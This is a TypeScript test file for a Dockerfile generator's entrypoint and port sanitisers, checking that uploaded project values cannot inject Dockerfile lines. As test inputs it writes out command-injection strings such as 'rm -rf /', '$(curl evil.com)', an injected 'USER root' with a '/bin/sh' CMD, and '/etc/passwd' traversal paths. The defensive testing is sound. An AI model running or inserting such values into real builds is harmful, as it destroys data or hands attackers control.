/**
 * Tests: dockerfile-gen + dockerfile-safe.
 *
 * The wave-deploy-agent's promise is to be a security gate for vibe-coded
 * projects. If a user-uploaded `package.json#main` can inject extra
 * `USER root` / `CMD ["/bin/sh"]` lines into the generated Dockerfile, the
 * gate has a hole: the project gets to rewrite the deploy pipeline that's
 * supposed to be checking it. Cloud Build's sandbox limits blast radius
 * but the principle is violated.
 *
 * What we lock in here:
 *   - sanitizeEntrypoint rejects newlines, double quotes, backticks, $(),
 *     backslashes, leading slash, `..` path segments, > 200 chars
 *   - sanitizePort returns a safe Cloud Run-friendly fallback for any
 *     out-of-range / non-integer / non-numeric input
 *   - generateNodeDockerfile / Python / Go / Static produce exactly one
 *     CMD line, no extra USER lines, no extra RUN lines after the template
 *   - dockerignore for every language includes .env + .env.local
 *
 * Run: bun run src/test-dockerfile-gen.ts
 */

import assert from 'node:assert/strict';
import { sanitizeEntrypoint, sanitizePort } from './services/dockerfile-safe.js';
import { generateDockerfile, generateDockerignore } from './services/dockerfile-gen.js';
import type { DetectionResult } from './services/project-detector.js';

let passed = 0;
let failed = 0;

function test(name: string, fn: () => void): void {
  try {
    fn();
    console.log(`  PASS  ${name}`);
    passed++;
  } catch (err) {
    console.error(`  FAIL  ${name}`);
    console.error(`        ${(err as Error).message}`);
    failed++;
  }
}

console.log('\n=== dockerfile-gen unit tests ===\n');

// Build a base detection result that callers can spread + override.
function baseDetection(overrides: Partial<DetectionResult> = {}): DetectionResult {
  return {
    language: 'typescript',
    framework: null,
    packageManager: 'npm',
    entrypoint: 'dist/index.js',
    port: 8080,
    confidence: 'high',
    needsBuild: true,
    ...overrides,
  } as DetectionResult;
}

// ─── sanitizeEntrypoint: happy paths ────────────────────────

test('sanitizeEntrypoint: simple POSIX path passes through', () => {
  assert.equal(sanitizeEntrypoint('dist/index.js', 'fallback'), 'dist/index.js');
  assert.equal(sanitizeEntrypoint('build/server.js', 'fallback'), 'build/server.js');
  assert.equal(sanitizeEntrypoint('app.js', 'fallback'), 'app.js');
  assert.equal(sanitizeEntrypoint('src/main.ts', 'fallback'), 'src/main.ts');
});

test('sanitizeEntrypoint: scoped npm name allowed via @', () => {
  // Some projects use @scoped paths as main; we don't ban @
  assert.equal(sanitizeEntrypoint('@my-org/server.js', 'fb'), '@my-org/server.js');
});

test('sanitizeEntrypoint: dot-prefixed file allowed', () => {
  assert.equal(sanitizeEntrypoint('.bin/server', 'fb'), '.bin/server');
});

test('sanitizeEntrypoint: trims surrounding whitespace', () => {
  assert.equal(sanitizeEntrypoint('  dist/index.js  ', 'fb'), 'dist/index.js');
});

// ─── sanitizeEntrypoint: rejection cases ────────────────────

test('sanitizeEntrypoint: non-string → fallback', () => {
  assert.equal(sanitizeEntrypoint(undefined, 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint(null, 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint(42, 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint({}, 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint([], 'fb'), 'fb');
});

test('sanitizeEntrypoint: empty / whitespace-only → fallback', () => {
  assert.equal(sanitizeEntrypoint('', 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint('   ', 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint('\t\n', 'fb'), 'fb');
});

test('sanitizeEntrypoint: internal newline → fallback (CRITICAL: prevents Dockerfile line injection)', () => {
  assert.equal(sanitizeEntrypoint('x"]\nUSER root\nCMD ["sh', 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint('line1\nline2', 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint('a.js\nUSER root', 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint('a.js\rUSER root', 'fb'), 'fb');
});

test('sanitizeEntrypoint: trailing newline trimmed → safe value preserved (no injection)', () => {
  // trim() strips trailing \n /\r before allowlist check, so only internal newlines pose risk
  assert.equal(sanitizeEntrypoint('a.js\n', 'fb'), 'a.js');
  assert.equal(sanitizeEntrypoint('a.js\r\n', 'fb'), 'a.js');
});

test('sanitizeEntrypoint: double quote → fallback (escapes JSON CMD form)', () => {
  assert.equal(sanitizeEntrypoint('a"b.js', 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint('a.js"', 'fb'), 'fb');
});

test('sanitizeEntrypoint: backslash → fallback (JSON escape vector)', () => {
  assert.equal(sanitizeEntrypoint('a\\b.js', 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint('a\\nbad', 'fb'), 'fb');
});

test('sanitizeEntrypoint: backtick → fallback (shell substitution)', () => {
  assert.equal(sanitizeEntrypoint('a`whoami`.js', 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint('`evil`', 'fb'), 'fb');
});

test('sanitizeEntrypoint: dollar sign → fallback (shell expansion / $())', () => {
  assert.equal(sanitizeEntrypoint('$HOME/x.js', 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint('a$(whoami).js', 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint('${VAR}', 'fb'), 'fb');
});

test('sanitizeEntrypoint: leading slash → fallback (escapes /app workdir)', () => {
  assert.equal(sanitizeEntrypoint('/etc/passwd', 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint('/dist/index.js', 'fb'), 'fb');
});

test('sanitizeEntrypoint: `..` path segment → fallback (path traversal)', () => {
  assert.equal(sanitizeEntrypoint('../etc/passwd', 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint('a/../etc/passwd', 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint('a/b/..', 'fb'), 'fb');
});

test('sanitizeEntrypoint: tab / NUL / control chars → fallback', () => {
  assert.equal(sanitizeEntrypoint('a\tb.js', 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint('a\x00b.js', 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint('a\x07b.js', 'fb'), 'fb');
});

test('sanitizeEntrypoint: internal whitespace → fallback', () => {
  assert.equal(sanitizeEntrypoint('a b.js', 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint('dist /index.js', 'fb'), 'fb');
});

test('sanitizeEntrypoint: > 200 chars → fallback', () => {
  const longPath = 'a/'.repeat(150) + 'x.js'; // 304 chars
  assert.equal(sanitizeEntrypoint(longPath, 'fb'), 'fb');
});

test('sanitizeEntrypoint: exactly 200 chars allowed', () => {
  // Build something that's exactly 200 chars and matches the allowlist
  const filler = 'a'.repeat(196);
  const path = `${filler}/x.js`; // 196 + 5 = 201 — bump down
  const path200 = path.slice(0, 200);
  assert.equal(sanitizeEntrypoint(path200, 'fb'), path200);
});

test('sanitizeEntrypoint: parens → fallback (shell grouping)', () => {
  assert.equal(sanitizeEntrypoint('a(b).js', 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint('(echo evil)', 'fb'), 'fb');
});

test('sanitizeEntrypoint: semicolon / pipe / ampersand → fallback (shell separators)', () => {
  assert.equal(sanitizeEntrypoint('a;b', 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint('a|b', 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint('a&b', 'fb'), 'fb');
  assert.equal(sanitizeEntrypoint('a&&b', 'fb'), 'fb');
});

// ─── sanitizePort ────────────────────────────────────────────

test('sanitizePort: valid number passes through', () => {
  assert.equal(sanitizePort(8080), 8080);
  assert.equal(sanitizePort(3000), 3000);
  assert.equal(sanitizePort(80), 80);
  assert.equal(sanitizePort(65535), 65535);
  assert.equal(sanitizePort(1), 1);
});

test('sanitizePort: numeric string passes through', () => {
  assert.equal(sanitizePort('8080'), 8080);
  assert.equal(sanitizePort('3000'), 3000);
});

test('sanitizePort: 0 → fallback (Cloud Run rejects port 0)', () => {
  assert.equal(sanitizePort(0), 8080);
});

test('sanitizePort: negative → fallback', () => {
  assert.equal(sanitizePort(-1), 8080);
  assert.equal(sanitizePort(-99999), 8080);
});

test('sanitizePort: > 65535 → fallback', () => {
  assert.equal(sanitizePort(65536), 8080);
  assert.equal(sanitizePort(99999999), 8080);
});

test('sanitizePort: non-integer → fallback', () => {
  assert.equal(sanitizePort(8080.5), 8080);
  assert.equal(sanitizePort('80.5'), 8080);
});

test('sanitizePort: NaN / Infinity → fallback', () => {
  assert.equal(sanitizePort(NaN), 8080);
  assert.equal(sanitizePort(Infinity), 8080);
  assert.equal(sanitizePort(-Infinity), 8080);
});

test('sanitizePort: non-numeric string → fallback', () => {
  assert.equal(sanitizePort('abc'), 8080);
  assert.equal(sanitizePort('80; rm -rf /'), 8080);
  assert.equal(sanitizePort(''), 8080);
});

test('sanitizePort: undefined / null / object → fallback', () => {
  assert.equal(sanitizePort(undefined), 8080);
  assert.equal(sanitizePort(null), 8080);
  assert.equal(sanitizePort({}), 8080);
  assert.equal(sanitizePort([]), 8080);
});

test('sanitizePort: custom fallback respected', () => {
  assert.equal(sanitizePort(0, 5000), 5000);
  assert.equal(sanitizePort('bad', 3000), 3000);
});

// ─── generateDockerfile: structural invariants per language ─

function countLines(content: string, prefix: string): number {
  return content.split('\n').filter((line) => line.trim().startsWith(prefix)).length;
}

test('generateDockerfile node: exactly 1 CMD line', () => {
  const out = generateDockerfile(baseDetection({ entrypoint: 'dist/index.js' }));
  assert.equal(countLines(out, 'CMD '), 1, 'expected exactly one CMD line');
});

test('generateDockerfile node: 0 USER root lines', () => {
  const out = generateDockerfile(baseDetection({ entrypoint: 'dist/index.js' }));
  assert.ok(!out.includes('USER root'), 'expected no USER root line');
});

test('generateDockerfile node nextjs: exactly 1 CMD, USER nextjs (not root)', () => {
  const out = generateDockerfile(baseDetection({ framework: 'nextjs' }));
  assert.equal(countLines(out, 'CMD '), 1);
  assert.ok(out.includes('USER nextjs'));
  assert.ok(!out.includes('USER root'));
});

test('generateDockerfile python: exactly 1 CMD line', () => {
  const out = generateDockerfile(baseDetection({ language: 'python', framework: 'fastapi' }));
  assert.equal(countLines(out, 'CMD '), 1);
});

test('generateDockerfile go: exactly 1 CMD line', () => {
  const out = generateDockerfile(baseDetection({ language: 'go' }));
  assert.equal(countLines(out, 'CMD '), 1);
  assert.ok(!out.includes('USER root'));
});

test('generateDockerfile static: exactly 1 CMD line', () => {
  const out = generateDockerfile(baseDetection({ language: 'static' }));
  assert.equal(countLines(out, 'CMD '), 1);
});

// ─── generateDockerfile SECURITY: malicious entrypoint rejected ───

test('SECURITY: entrypoint with newline does NOT inject extra Dockerfile lines', () => {
  const malicious = 'x"]\nUSER root\nCMD ["/bin/sh"';
  const out = generateDockerfile(baseDetection({ entrypoint: malicious }));
  assert.equal(countLines(out, 'CMD '), 1, 'must produce exactly 1 CMD line even with malicious entrypoint');
  assert.ok(!out.includes('USER root'), 'must NOT contain injected USER root');
  assert.ok(!out.includes('/bin/sh'), 'must NOT contain injected sh CMD');
  // Should fall back to dist/index.js
  assert.ok(out.includes('dist/index.js'), 'should fall back to dist/index.js');
});

test('SECURITY: entrypoint with double quote does NOT escape CMD JSON array', () => {
  const malicious = 'a"; rm -rf /; "b';
  const out = generateDockerfile(baseDetection({ entrypoint: malicious }));
  assert.equal(countLines(out, 'CMD '), 1);
  assert.ok(!out.includes('rm -rf'), 'must NOT contain injected rm -rf');
  assert.ok(out.includes('dist/index.js'));
});

test('SECURITY: entrypoint with backtick does NOT inject command substitution', () => {
  const malicious = 'a`whoami`.js';
  const out = generateDockerfile(baseDetection({ entrypoint: malicious }));
  assert.ok(!out.includes('`whoami`'), 'must NOT contain backtick substitution');
  assert.ok(out.includes('dist/index.js'));
});

test('SECURITY: entrypoint with $() does NOT inject command substitution', () => {
  const malicious = 'a$(curl evil.com).js';
  const out = generateDockerfile(baseDetection({ entrypoint: malicious }));
  assert.ok(!out.includes('$(curl'), 'must NOT contain $() substitution');
  assert.ok(out.includes('dist/index.js'));
});

test('SECURITY: malicious port value → fallback (no injection of EXPOSE bad)', () => {
  // We need to feed a bogus port that would expand into something dangerous if interpolated raw.
  // Since DetectionResult.port is typed `number`, the practical risk is NaN propagation
  // or huge numbers; both must be neutralized.
  const out = generateDockerfile(baseDetection({ port: NaN as unknown as number }));
  assert.ok(out.includes('EXPOSE 8080'), 'EXPOSE should fall back to 8080');
  assert.ok(!out.includes('EXPOSE NaN'), 'must NOT contain EXPOSE NaN');
  assert.ok(out.includes('ENV PORT=8080'));
});

test('SECURITY: port 0 → fallback (Cloud Run rejects 0)', () => {
  const out = generateDockerfile(baseDetection({ port: 0 }));
  assert.ok(out.includes('EXPOSE 8080'));
  assert.ok(out.includes('ENV PORT=8080'));
});

test('SECURITY: port 99999 → fallback (out of range)', () => {
  const out = generateDockerfile(baseDetection({ port: 99999 }));
  assert.ok(out.includes('EXPOSE 8080'));
  assert.ok(!out.includes('99999'));
});

test('SECURITY: leading-slash entrypoint → fallback (no /etc/passwd CMD)', () => {
  const out = generateDockerfile(baseDetection({ entrypoint: '/etc/passwd' }));
  assert.ok(!out.includes('/etc/passwd'));
  assert.ok(out.includes('dist/index.js'));
});

test('SECURITY: ../ entrypoint → fallback (no path traversal)', () => {
  const out = generateDockerfile(baseDetection({ entrypoint: '../../etc/passwd' }));
  assert.ok(!out.includes('etc/passwd'));
  assert.ok(out.includes('dist/index.js'));
});

test('SECURITY: empty entrypoint → fallback (default safe path used)', () => {
  const out = generateDockerfile(baseDetection({ entrypoint: '' }));
  assert.ok(out.includes('dist/index.js'));
});

test('SECURITY: null entrypoint → fallback', () => {
  const out = generateDockerfile(baseDetection({ entrypoint: null }));
  assert.ok(out.includes('dist/index.js'));
});

// ─── generateDockerignore: every language excludes secrets ───

test('dockerignore typescript includes .env and .env.local', () => {
  const out = generateDockerignore(baseDetection({ language: 'typescript' }));
  const lines = out.split('\n');
  assert.ok(lines.includes('.env'), '.env must be in dockerignore');
  assert.ok(lines.includes('.env.local'), '.env.local must be in dockerignore');
});

test('dockerignore python includes .env and .env.local', () => {
  const out = generateDockerignore(baseDetection({ language: 'python' }));
  const lines = out.split('\n');
  assert.ok(lines.includes('.env'));
  assert.ok(lines.includes('.env.local'));
});

test('dockerignore go includes .env and .env.local', () => {
  const out = generateDockerignore(baseDetection({ language: 'go' }));
  const lines = out.split('\n');
  assert.ok(lines.includes('.env'));
  assert.ok(lines.includes('.env.local'));
});

test('dockerignore static includes .env and .env.local', () => {
  const out = generateDockerignore(baseDetection({ language: 'static' }));
  const lines = out.split('\n');
  assert.ok(lines.includes('.env'));
  assert.ok(lines.includes('.env.local'));
});

// ─── generateDockerfile happy path: legitimate entrypoint preserved ──

test('legitimate entrypoint preserved verbatim in node Dockerfile', () => {
  const out = generateDockerfile(baseDetection({ entrypoint: 'build/server.js' }));
  assert.ok(out.includes('"build/server.js"'), 'entrypoint must appear in CMD');
});

test('legitimate port preserved verbatim in node Dockerfile', () => {
  const out = generateDockerfile(baseDetection({ port: 3000 }));
  assert.ok(out.includes('EXPOSE 3000'));
  assert.ok(out.includes('ENV PORT=3000'));
});

test('legitimate port preserved in python Dockerfile', () => {
  const out = generateDockerfile(baseDetection({ language: 'python', port: 8000 }));
  assert.ok(out.includes('EXPOSE 8000'));
  assert.ok(out.includes('ENV PORT=8000'));
});

test('legitimate port preserved in go Dockerfile', () => {
  const out = generateDockerfile(baseDetection({ language: 'go', port: 9090 }));
  assert.ok(out.includes('EXPOSE 9090'));
  assert.ok(out.includes('ENV PORT=9090'));
});

// ─── unsupported language ───────────────────────────────────

test('generateDockerfile throws on unsupported language', () => {
  assert.throws(
    () => generateDockerfile(baseDetection({ language: 'rust' as DetectionResult['language'] })),
    /Unsupported language/,
  );
});

// ─── R44g: Prisma generate injection ─────────────────────────

test('R44g: nextjs + hasPrisma=true → injects RUN prisma generate before npm run build', () => {
  const out = generateDockerfile(baseDetection({ framework: 'nextjs', hasPrisma: true }));
  assert.match(out, /RUN DATABASE_URL="file:\/tmp\/prisma-build-placeholder\.db" npx prisma generate\nRUN npm run build/);
});

test('R44g: nextjs + hasPrisma=false → no prisma generate line', () => {
  const out = generateDockerfile(baseDetection({ framework: 'nextjs', hasPrisma: false }));
  assert.ok(!out.includes('prisma generate'), 'no prisma generate when hasPrisma=false');
});

test('R44g: nextjs + hasPrisma undefined → no prisma generate line (default off)', () => {
  // Cast factory does not set hasPrisma; should default to falsy → no injection
  const out = generateDockerfile(baseDetection({ framework: 'nextjs' }));
  assert.ok(!out.includes('prisma generate'));
});

test('R44g: prisma generate appears AFTER COPY . . in builder stage', () => {
  const out = generateDockerfile(baseDetection({ framework: 'nextjs', hasPrisma: true }));
  const copyIdx = out.indexOf('COPY . .');
  const prismaIdx = out.indexOf('prisma generate');
  const buildIdx = out.indexOf('RUN npm run build');
  assert.ok(copyIdx !== -1 && prismaIdx !== -1 && buildIdx !== -1);
  assert.ok(copyIdx < prismaIdx, 'prisma generate must come after COPY . .');
  assert.ok(prismaIdx < buildIdx, 'prisma generate must come before npm run build');
});

test('R44g: still exactly 1 CMD line when hasPrisma=true (no Dockerfile bloat)', () => {
  const out = generateDockerfile(baseDetection({ framework: 'nextjs', hasPrisma: true }));
  assert.equal(countLines(out, 'CMD '), 1);
});

test('R44g: non-nextjs Node project + hasPrisma=true → no prisma injection (only nextjs path patches)', () => {
  // Current scope: only the nextjs branch injects. Non-nextjs Node Dockerfile uses
  // `npm run build 2>/dev/null || true` which won't fail-stop on Prisma errors anyway.
  const out = generateDockerfile(baseDetection({ framework: null, hasPrisma: true }));
  assert.ok(!out.includes('prisma generate'));
});

// ─── done ──────────────────────────────────────────────────

console.log(`\n=== ${passed} passed, ${failed} failed ===\n`);
process.exit(failed === 0 ? 0 : 1);
